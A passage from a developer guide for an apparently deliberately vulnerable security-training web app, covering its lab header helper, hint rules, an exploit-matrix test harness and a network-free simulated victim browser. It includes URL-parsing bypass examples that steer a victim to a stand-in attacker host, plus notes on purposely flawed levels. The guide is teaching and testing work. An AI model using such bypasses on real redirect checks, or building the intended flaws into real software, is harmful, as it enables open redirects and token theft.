  lab bug, a stack-free 500. `{}` sets nothing, so every level can export a value.
- **It refuses** a response that is not a lab route (no `res.locals.labPath`), one whose headers are sent, and one that
  already carries one of its headers (two decisions for one header are never merged or overwritten). A refused call sets
  nothing.
- **`labHeaders(h)`** is the same lines as a frozen plain object (wire names, `LAB_HEADER_NAMES`): put them in the
  citadel twin's `SimResponse`, so the victim's browser gets what the player's does.
- **A previewFrame inherits the page's CSP** (a srcdoc document takes its parent's policy). A `script-src` without
  `'unsafe-inline'` therefore blocks the preview's banner shim and every inline payload in it, as a browser would. The
  platform layout has no inline script or handler (htmx is a file under `/static/`), so `script-src 'self'` leaves the
  lab bar and the victim panel working.
- **The XSS oracle evaluates only CSP `sandbox`** (section 13). A policy is defence in depth: a Divine level encodes or
  sanitizes, and its spec's mutation "encoding removed, CSP kept" must go red.
- Header-shaped lessons whose bytes are not HTTP-header values (a `<meta>` CSP, a `<meta>` frame option) stay in the
  level's markup; this helper writes response headers only.
- **Limiters and lockouts must not be beaten by waiting.** A short window or a short lock turns a brute-force lab
  into "wait and retry" at every level, Divine included. Use long windows or locks (15 min or more) below Divine and
  an escalating per-account lockout at Divine (the fifth failure locks, every further one doubles it, capped), so
  that the designed bypass, not patience, is the practical path. Re-signing-in, resending a code or any other
  convenience flow must not hand the budget back either (add a "re-sign-in" scenario to the spec).
- **Time-dependent behaviour uses an injectable clock** (`state.now`, a test seam on the lab state), never
  `setTimeout`, `sleep` or real minutes: tests move the clock (`state.now = () => t`) and stay fast. A lab that must
  really wait (a race window, a simulated delay) waits on the Relic Market clock, clamped and swappable (sections 11, 12).

## 5. Views, language and hints

- **Language policy.** Content inside a lab (the vulnerable app's own headings,
  labels, messages) is English by design: it is a realistic target. All player
  guidance is bilingual (ID/EN): `title`, `summary` and `hints` are `Text`
  values; platform strings go in `core/i18n.ts`.
- **The lab bar is automatic.** The layout shows the id, title, summary, served
  level, a level switcher and a link back to `/c/<id>` on every challenge route,
  and sets `<title>` to `<id> — <title>`. Do not repeat these in the view. A view cannot pass `title`: it is a
  reserved key (sendPage throws), so the platform owns the document `<title>`; name a heading `heading`.
- **Lab views** (see `gk-01-sqli-login/views/login.ejs`): wrap the app in
  `<section class="lab">`; show messages in `<p class="lab-message lab-success|lab-error">`;
  tell the player their own account if the lab has one; use text inputs so
  payloads stay visible; keep submitted values (escaped) after a POST; post back
  to the lab with no `action` attribute.
- **Escape everything** with the escaped output tag. If the vulnerability is in
  rendering (XSS), the level module builds that one fragment (escaping it or
  not) and the view outputs only that fragment raw.
- **Never put an EJS tag inside an EJS comment.** The comment ends at the first
  closing delimiter and the rest breaks parsing. Describe tags in words.
- **Hints**: three tiers (typically cost 10/20/40), bilingual, each more
  specific, none containing a literal payload. Point at the mechanism (where
  input goes, which field is filtered, what a wildcard means). Phrase tier 3 as a
  guiding question ("what besides waiting makes the lock forget?", "who keeps the
  count?"), and make every tier add information the page does not already state.

## 6. Testing: the exploit matrix

Every challenge spec declares its matrix with `describeExploitMatrix` from
`tests/helpers.ts`; it generates named cases, one level each:

```ts
describeExploitMatrix<Creds>({
  challenge: GK01,
  path: '/d/gatekeeper/sqli-login',
  send: (agent, _level, creds, url) => agent.post(url).type('form').send(creds),
  exploits: { acolyte: {...}, templar: {...}, inquisitor: {...} }, // one per non-Divine level
  resisted: 'Invalid credentials.',            // the answer to an exploit at Divine (or a per-exploit-level map)
  legit: [{ name: 'own account', input: { username: 'pilgrim', password: 'pilgrim' }, expect: 'Welcome, pilgrim' }],
  malformed: [{ name: 'lone quote', input: { username: 'pilgrim', password: "'" }, levels: ['acolyte', 'templar'] }], // or []
  privileged: {                                 // or null
    name: 'real admin',
    input: { username: 'citadel_admin', password: adminPassword('divine') },
    expect: /Welcome, citadel_admin/,
  },
  // optional: cumulative: ['inquisitor'],      // see (g); explain why in the spec
  // optional: errorRe: /Parser error/,         // parser labs; default DB_ERROR_RE
});
```

`send` gets a fifth argument `{ sid }`, the case's session id, so stateful labs can
reach per-session test seams (a secret, a counter). One `send` may fire several
requests (a scenario: N failed logins, then the real one) and return the last response.

Required cases (generated):

- **(a)** `exploits` keys equal the challenge's non-Divine levels.
- **(b)** each exploit at its level shows a flag that `/api/submit` credits at exactly that level.
- **(c)** Divine answers every exploit with `resistedStatus` (default 200), the `resisted` text, no flag and no error text.
- **(d)** each `malformed` input shows error text at its listed levels and none at Divine.
- **(e)** each `legit` input works at every level: 200, expected text, no flag.
- **(f)** the `privileged` input (real credentials) works at Divine with no flag.
- **(g)** step-up: the exploit for each level is resisted (no flag) at EVERY
  implemented non-Divine level above it, so a regression two levels up is caught
  too (only "no flag" is required there, not the `resisted` text). On by default.
  `cumulative: [level]` skips that level for exploits from below, when they
  legitimately still work there; it must be explicit and explained in the spec.
  `resisted` may also be a map keyed by the exploit's level, when Divine answers
  different exploits differently (case (c) uses the entry for that exploit).

`resistedStatus` (optional, default 200) is the status Divine answers exploits with in (c): a
number, a non-empty list of accepted numbers, or a map keyed by the exploit's level (levels not
in the map expect 200). Use it for API-style or access-control labs (JWT APIs, IDOR, broken
access control) where a real 401/403/404 teaches more than a polite 200. Values must be integers
100-599, or setup throws. It changes only the status: Divine must still never show a flag or
error text, and the `resisted` text must still match. The other cases ((d)-(f)) keep asserting 200.

"Error text" is `errorRe` (default `DB_ERROR_RE`; pair `/Parser error/` with a
`tryDb` label). `malformed: []` and `privileged: null` are explicit opt-outs
for labs with no such errors or no privileged identity. Add challenge-specific
tests next to the matrix (GK-01: per-level isolation, view escaping, kept
values, non-string fields). `FLAG_RE` and `DB_ERROR_RE` are exported for them.

**The matrix cannot see a Divine flaw on a channel Divine never reads.** An exploit that travels in a cookie or header
is replayed at Divine too (cases (c) and (g)), so name that cookie or header after the level the exploit is SENT TO
(`relic_region_${level}`, as RM-02 does). If the script always sends `relic_region_inquisitor`, Divine ignores it and the
case passes even when Divine concatenates its own cookie: a mutant that makes Divine as weak as Inquisitor stays green.

The matrix scans every response for a flag in its page text, and, when a response has no text (an `application/octet-stream` download: supertest keeps only `res.body`, a Buffer), in its bytes as Latin-1 too. So a flag leaked in a download body goes red like one in a page (`tests/helpers.spec.ts` proves both ways).

Test plumbing for stateful labs (all in `tests/helpers.ts`): `send(..., { sid, app })` for per-session test seams;
`bare(app, sid, 'name=value')` for requests that carry only the session cookie plus a cookie the lab did not
give you (the agent's jar always wins over a hand-set Cookie header, so never reach into supertest internals);
`runWarmupThenFinal(scenario, fire)` for "N failures, then the real secret"; and
`describeLabView({ ... })` (probes the first implemented non-Divine level; put every form field except the echoed one in `extra`) for the view basics every lab shares (own account told, no `type="password"`,
forms without `action`, escaped payload, odd bodies not a 500, message classes, upper-case URL uses the canonical
path). Do not write assertions inside an `if` that can pass vacuously: draw new sessions until the condition
holds, then assert unconditionally. Exploit scripts must detect success by "not the denial text", not only by a
flag, because Divine never shows one.

One server per app: `import request from 'supertest'` in a spec is aliased (`vitest.config.ts`) to
`tests/support/supertest.ts`, so `request(app)` / `request.agent(app)` with an Express app listen ONCE per app
(closed when the test ends) and reuse keep-alive sockets. Plain supertest starts a server and a connection per request,
which leaves thousands of sockets in TIME_WAIT and exhausts ephemeral ports (`EADDRINUSE` in unrelated specs). Keep
using `request` / `freshSession` / `bare` as usual; `serve(app)` (from `tests/helpers.ts`) returns the http.Server.
Pass the app, not a hand-made `http.Server`: `listen(port, host)` binds a tick later, and supertest would listen and
close a server with no address again on every request, so `request(server)` refuses one that is not listening yet.
Never deep-import or `require` the real supertest (`tests/tooling.spec.ts` fails if a spec does). Test servers listen on a random port on all interfaces for the length of a test (see `docs/SECURITY.md`): run tests on a trusted network.

One cookie jar per sweep: a request without `hvwa_sid` mints a new session, and the app issues at most 60 a minute
(429 beyond). A spec that sweeps many pages of one app (the `tests/labs.spec.ts` smoke test: every lab at every level)
keeps one `request.agent(app)`, like a browser and `verify:dist`, instead of a cookieless `request(app)` per page.

**Mutation self-check** before committing (revert by rewriting the file, not
`git checkout` over uncommitted work):

1. Make one exploitable level secure: its exploit case goes red.
2. Make Divine fall for an exploit: its resist case goes red.
3. Make Divine leak an error message: the Divine malformed case goes red.
4. Make Divine show a flag to the privileged user: the privileged case goes red. `flagFor` and `issueFlag` throw at
   Divine, so the mutant must emit a real flag string, e.g. `flagFor({ ...req, level: 'acolyte' }, C)` or a literal
   matching `FLAG_RE`; otherwise case (f) goes red on the 500, not on "no flag", and proves less.
5. Copy the level below over a level: its step-up case goes red.

If a mutation stays green, the matrix is missing a case.

## 7. New-challenge checklist

1. Read the catalog row (levels, standard mapping) and this file.
2. Write `<id>.spec.ts` first (matrix + specifics); run `npm test -- <id>` and watch it fail.
3. `model.ts`: schema, seed, row types, the level-module interface, `perLevel` or `perSession` state, test seams.
   A lab where someone else must click (a reset mail, an OAuth link, a session link) adds a simulated victim: section 8.
   A lab that takes uploads, archives or files keeps them in a simulated file system: section 9.
4. `levels/*.ts`: Acolyte no defense, Templar naive filter, Inquisitor flawed defense, Divine correct
   for the weakness; `divine.ts`'s comment notes generic errors and any gaps left out of scope.
5. `challenge.ts`: `byLevel<M>`, `register(defineChallenge({ ..., dir: challengeDir(import.meta.url), levels: impl.levels }))`,
   bilingual title/summary/3 hints, routes using `field`, `tryDb`, `flagFor`, `sendPage`. A victim-driven lab may keep
   `byLevel` in `model.ts` instead (its level files then import only types from it; section 8).
6. `views/*.ejs`: `.lab` markup, escaped output, English lab content (API-only labs: an HTML landing page).
7. Import `challenge.js` from the district `index.ts` (and the district from `src/districts/index.ts`).
8. Mutation self-check (section 6). For a stateful lab also: use `labPath` for links and cookie paths,
   bound attacker-keyed maps, and check that waiting and re-signing-in do not beat the limiter.
9. Catalog: the row already exists in `src/catalog.ts` (levels there must equal `impl.levels`; `tests/catalog.spec.ts` checks it).
   Run `npm run gen:catalog` so `docs/CATALOG.md` shows the row as ✅ registered, and commit it with the challenge
   (the stale-catalog test fails otherwise).
10. `npm test`, `npm run typecheck`, `npm run verify:dist` all green; commit `feat(<district>): <ID> <title>`.

Release gate: `npm run gate:catalog` prints `N/122 registered` and exits non-zero below 100. It is deliberately not part of
`npm test` (red until Phases 2-4 land); run it before a release.

## 8. Victim-driven labs (`core/sim.ts`)

Some flaws need someone else to click: the admin opens a reset mail whose link host came from a header (GK-09),
follows an OAuth authorize link while signed in (GK-10, GK-11), signs in through a session link (GK-16). The engine
simulates that victim deterministically and with **no real network**: nothing in `core/sim/` opens a socket,
resolves a name or fetches. A guard in `tests/sim.spec.ts` parses every module in `core/sim/` with the TypeScript
compiler and allows only a fixed list of runtime imports (no dynamic `import()`, `require` or network globals such as
`fetch` or `globalThis`; transitively they reach only `node:buffer`: the fixture reader lives in `core/fixtures.ts`), spies on fetch, http(s), http2,
tls, net, dgram and dns during a visit, and spies on `net.Socket.prototype.connect` for the whole spec file. The worked
example is the fixture lab SV-01 in `tests/sim-lab.spec.ts` (and XS-01 in `tests/sim-cross-lab.spec.ts` for CSRF, CORS
and clickjacking, "Across sites" below).

Import everything from `core/sim.ts`, a barrel over the pure simulation in `core/sim/` (`limits.ts`: `SIM_LIMITS` and
the copying clip; `url.ts`: the hosts and `classifySimUrl`; `cookies.ts`: the SameSite jar; `cross.ts`: the browser rules
across sites (Origin, Sec-Fetch, form bodies, CORS, framing); `browser.ts`: `SimBrowser`;
`world.ts`: `simWorld`, `simInbox`, `attackerLog`; no Express at runtime), the engine side in `core/victim.ts`
(`VictimConfig`, the presets, the panel, `mountVictim`, `sendSimRedirect`) and `core/twin.ts` (one page answer for both
browsers: `Reply`, `TwinCookie`, `toSim`, `sendReply`, `cookiePath`, `Visit`, `visitOf`, `simVisitOf`; see "A page that
moves on by itself" below).

### The two hosts

| Host | What it is | What happens to a request |
|---|---|---|
| `http://citadel.test` (default port only) | the lab itself, as the victim sees it: `http://citadel.test/<path>` is the lab route `<labPath>/<path>` | answered in process by the lab's handler |
| `http://attacker.test`, any `*.attacker.test`, any port | the player's server | appended to the player's attacker log; the visit ends there (nothing is served back) |
| anything else | IPs (any spelling), `localhost`, other hosts, citadel.test on another port or a subdomain of it, `javascript:`/`data:`/`file:` ... | unreachable; nothing is logged |

`classifySimUrl(url, base?)` decides, with the WHATWG URL parser browsers use (no DNS). It returns
`{ site, url, origin, host, path, search, query, userinfo, reason? }`; its comment lists the rules. In short: userinfo never
decides the site (`http://citadel.test@attacker.test/` is attacker.test, and the userinfo is never sent), one trailing
dot is dropped (`ATTACKER.TEST.`), `\` is `/` (`http://attacker.test\@citadel.test/` and `/\attacker.test` reach the
attacker), full-width letters map to ASCII while look-alike letters from other scripts become `xn--` labels (never a sim
host), empty labels are `other`, and URLs over `SIM_LIMITS.urlLength` (2048) before or after serialization are `other`.
`attacker.test.citadel.test` is `other`; `citadel.test.attacker.test` is the attacker. **Labs that teach a URL-parsing
flaw do their own (flawed) check in the level file** (`startsWith('http://citadel.test')`, a substring test, a
hand-written parser); the classifier is the ground truth for where the victim's browser then went.

### What is simulated

- **`simWorld({ mailboxes })`**: one player's world at one level: `world.inbox`, `world.attackerLog`, the victim's recent
  visits (`world.visits`) and a clock (`world.now`, a test seam like `state.now`). **`world.visits` starts afresh with
  every victim action** (the action's start clears it): it holds that action's visits, and any made after it, newest
  `SIM_LIMITS.visits`. A spec that presses the button twice reads the visits after each press, not both at the end.
- **`world.inbox`**: fixed mailboxes, `PLAYER_MAILBOX` (`pilgrim@citadel.test`) always plus the ones named (usually
  `ADMIN_MAILBOX`); mail to any other address bounces (`deliver()` returns `undefined`), so no map is keyed by attacker
  input. `deliver({ from, to, subject, body, links })`, `newest(address)`, `list(address)` (newest first). Links are an
  explicit list: "the admin clicks the first link" is `links[0]`.
- **`world.attackerLog`**: append-only, capped (oldest dropped, sequence numbers keep counting): method, URL, `Referer`,
  body (a form, or what your page sent home), time.
- **`world.browser(handler)`**: a victim's browser. `follow(url, { referrer? })` opens a link, `submit(url, form)` posts a
  form; both return a `SimVisit` trace (`outcome`: `page` | `attacker` | `unreachable` | `too-many-redirects` | `loop`,
  the `hops`, and the final citadel `page`). What the player's attacker page makes it do (a cross-site link or form, a
  `fetch()`, a frame and a click) is "Across sites" below. Its cookie jar (`browser.cookies`) holds citadel.test cookies
  only, never real ones and never sent to attacker.test; `cookies.set(name, value, { path?, secure?, sameSite?,
  expiresAt? })` signs the victim in up front (SameSite defaults to Lax, as Chrome's default; `'None'` needs
  `secure: true`). Every citadel request calls
  `handler(req: SimRequest): SimResponse` synchronously: `req` has `method`, `url`, `path`, `query`
  (URLSearchParams), lower-case `headers` (`origin` on every POST, `sec-fetch-*` on every request, as Chrome sends them),
  `cookies`, the form `body` (an urlencoded body's fields, or a JSON object's string members, as the app's own parsers
  read them; null prototypes; `field()` and `header()` work on it) and `rawBody` (the body exactly as sent: read a
  text/plain or JSON body there); the response is `{ status, headers?, body? }`, where `Location` (followed on 301, 302, 303, 307 and 308 only:
  any other status, a 300 or 304 with a Location included, is a page), `Set-Cookie`, `Refresh` and `Referrer-Policy`
  are honoured. A `Location` or `Refresh` value containing CR or LF is a malformed response (real HTTP cannot carry
  one, and URL parsing would silently drop it): the visit ends `unreachable` with an `other` hop whose reason is
  `invalid`, so a lab cannot pass in the sim on a header a real browser would never receive. At most 10 redirects; the same request again with the jar unchanged is a loop.
- **Referer, as real browsers send it**: a link opened from mail has none; `follow(url, { referrer })` is a click on a
  citadel page. **A redirect keeps the referrer of the page that started the navigation** (an open redirect does not leak
  its own URL). **A citadel page that moves the browser on by itself sends its own URL**: answer
  `200` with `Refresh: 0; url=<next>` (the stand-in for a meta refresh or a script; the sim does not parse HTML).
  `Referrer-Policy` on that page (or on a redirect) applies; the default is the legacy full URL
  (`no-referrer-when-downgrade`). The Referer never carries userinfo or a fragment. The victim's own navigations never
  start on attacker.test; only the cross-site primitives below do, from the player's page, under ITS policy (Chrome's
  `strict-origin-when-cross-origin` by default: the origin only).
  So an OAuth code leaks through `Referer` only from a page that forwards (GK-10 Inquisitor: the callback page moves on
  to `next=`), and Divine can stop it (`Referrer-Policy: no-referrer`, no secrets in URLs, no open forward).
- **Limits** (`SIM_LIMITS`): URL 2048 chars, 10 redirects, 3 mailboxes (the player's included) of 10 mails (subject 200,
  body 2000, 3 links), 30 log entries, 20 cookies of 4096 bytes, 5 visits (page bodies kept to 2000 chars), notes of
  500 chars. **Every stored field is a copy** (or a constant): a clipped field, a mail's `to` (the mailbox's own
  address, never the padded input), every URL the browser keeps, cookie names, values and paths, Referers. A trimmed,
  lower-cased, split or matched string, a URL getter or a query value can be a view that keeps its whole parent (a
  100 KB form field, a long fragment) alive, so the sim never stores one.

### All victim state goes through `perSession`

`simWorld()`, `simInbox()`, `attackerLog()` and `world.browser()` throw unless called inside a `perSession` factory, so
victim state is always per player and level, bounded, and inherits the new-instance limits. They also cap the holder
whose factory creates them (`capPerSessionHolder` in `core/lab.ts`), because a filled world is over a megabyte and
the container has 512 MB:

- **One byte budget for the whole process.** Every instance that keeps sim state (directly, or through a nested holder
  whose instance it keeps), in every lab and at every level, shares `CAPPED_BUDGET_BYTES` (96 MiB). Each store weighs
  its measured worst case plus ~10% (`SIM_LIMITS`): an inbox 576 KiB, an attacker log 416 KiB, a world's own visits
  288 KiB, a victim browser 224 KiB. So a `simWorld()` (its inbox, log and visits) weighs 1.25 MiB, and with one
  browser 1.47 MiB; a simulated file system (section 9) weighs 352 KiB; an XSS browser (section 13) adds its kept
  verdicts, 64 KiB (`XSS_LIMITS.verdictsWeight`), to its browser's weight. An instance weighs everything its factory built
  or used. Creating one that does not fit evicts the least recently used capped instances, whichever lab they belong
  to, as many as it takes; the new one is never refused. A reset, an idle-TTL expiry or the holder's own `maxEntries`
  gives the bytes back. No single store may weigh more than `MAX_STORE_WEIGHT` (1/16 of the budget; the built-ins are
  all under 1/32).
- **The lab's own state counts too: clip it, and declare it.** The budget only sees what is declared. A lab's own maps
  (sessions, codes, return URLs, flows...) are NOT in the sim stores' weights, so a victim-driven lab must (a) store every
  player string through the copying `clip` at a bounded length (a URL: `clip(s, SIM_LIMITS.urlLength + 1)`, one past the
  cap so an over-long value stays too long to follow), never the raw request value or a view of it, and (b) declare
  what its maps hold at worst with `declareLabWeight(STATE_WEIGHT, '<ID> lab state')` in its `perSession` factory:
  the maps filled to every cap with their longest values, measured with a full GC, plus a margin. Add the lab to
  `tests/lab-state-weights.spec.ts`, which keeps every declaration at or above its measurement (GK-10 declares
  736 KiB for ~662 KiB measured, GK-11 288 KiB for ~239, GK-16 128 KiB for ~99). **Only then does adding a
  victim-driven lab leave the 96 MiB bound intact**; an unclipped 16 KB string in a map of 50 is 1.6 MB the budget never
  sees. `declareLabWeight` caps the holder at `CAPPED_NEW_PER_MINUTE` (30) new instances a minute, like a sim store.
- **Eviction is a reset** of that player's instance at that level (section 4), and a shared budget turns over in
  minutes: keep no limiter, lockout or attempt budget in victim-driven state.
- At most `SIM_LIMITS.newWorldsPerMinute` (30) new instances a minute per holder, by default and as a ceiling: a lab may
  pass a lower `maxNewPerMinute`, never higher (asking for more fails at the first factory run).
- Tests may shrink the budget with `setCappedBudget(bytes)` from `core/lab.ts` (restore the value it returns), and read
  it with `cappedBudgetUsage()` (`{ bytes, instances, budget }`). **A spec that checks what one new instance adds to
  the budget makes room first**: a busy spec file fills the shared budget, and the eviction the new instance causes
  gives bytes back, so the difference comes out short. Raise the budget for the check and restore it in a `finally`:
  `const prev = setCappedBudget(cappedBudgetUsage().bytes + 64 * 1024 * 1024); try { ... } finally { setCappedBudget(prev); }`
  (SC-02, FP-05).

Keep the world and the victim's browser in the lab's own per-session state, next to whatever else the lab tracks
(accounts, tokens, codes), so one eviction or one `reset` drops all of it together:

```ts
// model.ts
export interface LabState { readonly world: SimWorld; readonly admin: SimBrowser; readonly adminPid: string; /* accounts, tokens ... */ }
const labs = perSession((level): LabState => {
  const world = simWorld({ mailboxes: [ADMIN_MAILBOX] });
  const adminPid = newId(); // src/districts/_shared/collections.ts
  // Typed, not `as LabState`: an assertion silently accepts a missing required field. The handler reads `state` only
  // when the victim browses, after the const is assigned.
  const state: LabState = { world, admin: world.browser((r) => citadel(level, state, r)), adminPid /* , ... */ };
  state.admin.cookies.set('pid_session', adminPid); // already signed in to Pilgrim-ID
  return state;
});
export const labFor = (req: { sessionId: string; level: Level }) => labs.for(req);
```

The handler needs the level modules, and it lives where the factory does. So a victim-driven lab may gather them in
`model.ts` (`export const impl = byLevel<M>({ acolyte, templar, inquisitor, divine })`), and `challenge.ts` passes
`impl.levels` to `defineChallenge`. Its level files then import ONLY types from `model.ts`: a runtime import would close
an ESM cycle (model imports the levels). Shared values come from `_shared/` (e.g. `gatekeeper/_shared/oauth.ts`) or
are local constants in the level file. The page functions both browsers call and the citadel handler may live in
`model.ts` too (section 1). Worked examples: GK-10, GK-11, GK-16.

### How levels plug in

The handler is the lab seen from the victim's browser. It dispatches on `r.path` and calls **the same level functions
the real routes call**, so the flaw lives in `levels/*.ts` once and View Source and the Diff tell the whole story.
Paths are twins: `http://citadel.test/<path>` is the real route `<labPath>/<path>`, so the handler and the router
use the same path for the same page (`/idp/authorize` in both examples below):

```ts
// model.ts (with `impl`, so the factory above can build the handler)
function citadel(level: Level, state: LabState, r: SimRequest): SimResponse {
  const impl = byLevelImpl.for(level);
  if (r.path === '/idp/authorize') return impl.authorize(state, r.query, r.cookies.pid_session, ''); // { status: 302, headers: { Location } }
  if (r.path === '/reset') return { status: 200, body: 'Choose a new password' };
  return { status: 404, body: 'Not found' };
}
```

Real routes serve the player's real browser (Express, `sendPage`); the handler serves the victim (plain objects,
never HTTP). Links the lab builds for mails are sim URLs (`http://citadel.test/reset?token=...`, or whatever host a
flawed level put there); the panel turns citadel links in the player's own mailbox into "open in lab" links
(`labHref`), and shows every other link as text.

**Where the lab lives is a parameter.** One level function answers both browsers, the player's at
`/d/<district>/<slug>/...` and the victim's at `http://citadel.test/...`, so it never hard-codes either: it takes a
`base` and builds every lab-local `Location` (`${base}/idp/login`) and cookie `Path` (`base || '/'`) from it. Real
routes pass `labPath(res)`; the citadel handler passes `''` (use `CITADEL_ORIGIN` where a sim URL must be absolute, e.g.
a link in a mail or a registered `redirect_uri`). A hard-coded `Path=/d/...` never matches in the victim's jar (its
requests are for `/callback`), and a hard-coded `/callback` leaves the lab on a real route.

**A real route never answers a sim URL with `res.redirect`.** URLs that are data (the registered
`http://citadel.test/callback`, a player's `redirect_uri` or `next=`) are sim URLs: the player's own browser cannot reach
citadel.test, and `res.redirect(redirect_uri)` from a lab route would be a REAL open redirect off the loopback lab.
Answer a level's 3xx with `sendSimRedirect(res, location, status?)`: a citadel URL (or a path under `labPath(res)`)
goes to the same place in the lab at the served level (the IdP's `302 http://citadel.test/callback?code=...` becomes
`302 <lab>/callback?code=...&level=<level>`); anything else (attacker.test, another host, `javascript:`) gets a page
that shows the URL as text and says that in this lab the simulated victim's browser goes there. It never links to it.
An empty or blank Location (an empty `redirect_uri`) gets a "this redirect has no target" page, never a redirect to
the route itself.

**A page that moves on by itself is as much a redirect.** A level page that forwards (the sim's `200` + `Refresh`, e.g.
GK-10 Inquisitor's callback forwarding to `next=`) must never send the player's real browser a real `Refresh` to a
level-made URL either, and a silent 302 would hide the very forward the lab teaches. Render the page instead, with a
note saying where it moves the browser on to: a link to the same place in the lab for a citadel target, the URL as
escaped text otherwise.

**The twin: one `Reply`, two browsers (`core/twin.ts`, imported from `core/sim.ts`).** A page function answers a
`Reply` (`status`, `location?`, `forward?`, `referrerPolicy?`, `cookies?`, `text`), and the engine turns it into each
browser's answer:

- `toSim(reply)` for the citadel handler: a `SimResponse` with `Location`, `Refresh: 0; url=<forward>`,
  `Referrer-Policy` and one `Set-Cookie` per cookie.
- `sendReply(res, reply, render)` for the real route: it sets the cookies, sends a `location` through `sendSimRedirect`
  only on a redirect status (`REDIRECT_STATUSES`; a Location on any other status is a page, as in the sim), and
  otherwise calls `render(forward?)` at the Reply's status, handing a forward's `ForwardNote` to the view. A view at
  `src/districts/<district>/<lab>/views/` includes the engine's note with
  `<%- include('../../../../core/views/forward-note', { forward: forward }) %>`. The page's own message, and a flag it
  carries, stay visible.
- **Cookies** (`TwinCookie`): `{ name, value, path, clear?, maxAgeSec?, httpOnly?, sameSite?, secure? }`. The path is
  `cookiePath(base)` (`base || '/'`). The defaults are HttpOnly and `SameSite=Lax` (as `hvwa_sid`), not Secure; both
  browsers get the same attributes, and the line always NAMES its SameSite. **Never set a session cookie without an
  explicit SameSite** (no raw `res.cookie` or `Set-Cookie` without it): Chrome treats such a cookie as Lax but still sends
  it on a cross-site POST for its first 2 minutes, which the sim does not model ("Across sites" below). `httpOnly: false` is for a cookie the lab means to be read or edited client-side.
  `sameSite: 'Strict' | 'Lax' | 'None'`: a lab whose lesson is SameSite (CSRF) sets it per level IN THE LEVEL FILE, so
  View Source and the Diff show it (Acolyte's `sameSite: 'None'` with `secure: true` is the realistic
  misconfiguration). Any other value throws, and so does `'None'` without `secure: true`, set or cleared: browsers
  drop a `SameSite=None` cookie that is not Secure, so the lab would test nothing. `secure: true` adds Secure. **Both
  browsers keep such a cookie:** the simulated jar treats `http://citadel.test` as a secure context, as browsers treat
  loopback (engine task E1; it used to refuse a Secure cookie on plain http), and applies SameSite ("Across sites"
  below). The player's own browser treats `http://127.0.0.1` as a secure context and keeps a Secure cookie from it in
  Chromium and Firefox, but Safari may not: a player on Safari may find a `SameSite=None; Secure` lab cookie missing in
  their own browser (the simulated victim is unaffected). `maxAgeSec` is in seconds (Express's
  `maxAge` is milliseconds: `sendReply` converts).
- **Requests** (`Visit`: `level`, `query` (the raw query string as `URLSearchParams`, never Express's parsed
  `req.query`; everything after the first `?`), `cookies` (only the lab's own, as strings), `base`):
  `visitOf(req, res, cookieNames)` on a real route (`base` is `labPath(res)`), `simVisitOf(level, r, cookieNames)` in
  the citadel handler (`base` is `''`). Give both the same names, one `labCookies(level)` list in `model.ts`, so a
  page function sees the same cookies in both browsers. (`simVisitOf` without names keeps every cookie the simulated
  browser sent: the behaviour before the filter, kept so older callers still compile; GK-10, 11 and 16 pass names.)
  The page function takes the `Visit` and never sees Express or the sim.
- **The request itself** (`RequestVisit`, a `Visit` plus the request; E1b): `visitOf` and `simVisitOf` return one, and
  take a fourth argument, `headerNames`, for headers the lab reads besides the usual ones. A level whose lesson is where
  a request came from (FP-01 to FP-04) types its page function's argument as `RequestVisit`:
  - `method` (`'GET'` or `'POST'`);
  - `headers`: `VISIT_HEADERS` (`origin`, `referer`, `content-type`, `sec-fetch-site`, `-mode`, `-dest`, `-user`,
    `x-requested-with`) plus the lab's names, lower-case, only those the request had; never cookie, host or user-agent;
  - `body`: the body's string fields as `bodyFields` reads `text` (an urlencoded form's, the first value of a repeated
    name; a JSON object's string members; none for text/plain);
  - `text`: the body as text. In the sim it is exactly what was sent. On the real route the app's global
    `express.json()` / `express.urlencoded()` have already parsed a JSON or form body, so `text` is **re-serialised from
    `req.body`**: the same fields, not the same bytes (key order, escapes, `a[]` names may differ). A text/plain body is
    read only on a route that mounts `twinBody()` (below);
  - `self`: this browser's own origin for the lab: `CITADEL_ORIGIN` in the sim, `<protocol>://<Host>` on the real route.

  Every value is a bounded copy (`TWIN_LIMITS`: a header 2049 characters, the text and each field 8 KiB) and the
  records have no prototype. **A level that checks Origin compares `visit.headers.origin === visit.self`, never a
  hard-coded `http://citadel.test`**: the player's own browser sends `Origin: http://127.0.0.1:<port>`, and a level
  that hard-codes the citadel refuses the player's legitimate form at Divine. `tests/twin-visit.spec.ts` checks that
  equivalent requests give equal Visits in both browsers, `self` aside.
- **`twinBody()`**: a state-changing route whose levels read a text/plain body (FP-01 Inquisitor's text/plain form,
  FP-02's JSON sent as text/plain) mounts it first: `router.post('/account/prefs', twinBody(), handler)`. The app's global
  parsers read no text/plain, so without it `text` is empty on the real route. It is route-local (as `express.raw` on the
  upload routes, owner decision Q6), reads `text/plain` only, at most 8 KiB (a bigger body gets 413 before the route
  runs); a JSON or urlencoded body on the same route was already parsed by the global parsers, so its `text` is still
  re-serialised. A GET route needs nothing.

```ts
// model.ts: one page function, both browsers
export const labCookies = (level: Level): readonly string[] => [pidCookie(level)];
export function authorize(v: Visit, state: LabState): Reply {
  const user = state.sessions.get(v.cookies[pidCookie(v.level)] ?? '');
  if (user === undefined) return { status: 200, text: 'Sign in first.' };
  const to = v.query.get('redirect_uri') ?? '';
  if (!impl.for(v.level).allowRedirect(to)) return { status: 400, text: 'Unregistered redirect_uri.' }; // the flaw: levels/*.ts
  return { status: 302, location: withParams(to, { code: issueCode(state, user) }), text: '' }; // districts/_shared/url.ts
}
function citadel(level: Level, state: LabState, r: SimRequest): SimResponse {
  if (r.path === '/idp/authorize') return toSim(authorize(simVisitOf(level, r, labCookies(level)), state));
  return { status: 404, body: 'Not found' };
}

// challenge.ts: the twin of http://citadel.test/idp/authorize, in the player's own browser
const visit = (req: Request, res: Response): Visit => visitOf(req, res, labCookies(req.level));
router.get('/idp/authorize', (req, res) => {
  const r = authorize(visit(req, res), labFor(req));
  return sendReply(res, r, () => sendPage(res, view('idp'), { base: labPath(res), text: r.text })); // never res.redirect
});
```

A lab that does not use `Reply` still answers a level's Location with `sendSimRedirect(res, location, status?)`, never
`res.redirect(location)`.

### Scripting the victim

The two usual actions are presets; use them unless the victim's script is different:

```ts
/** The admin starts every action signed in to Pilgrim-ID, whatever the player's last link did. */
const rearm = (req: Request, admin: SimBrowser) => { admin.cookies.set('pid_session', adminSession(labFor(req))); };

register(defineChallenge({
  /* id, district, slug, dir, title, summary, maps, levels, hints, mount */
  victim: {
    sim: (req) => labFor(req).world,
    actions: [
      // opens the newest mail in its mailbox and clicks links[link] (default 0), from a mail client (no Referer)
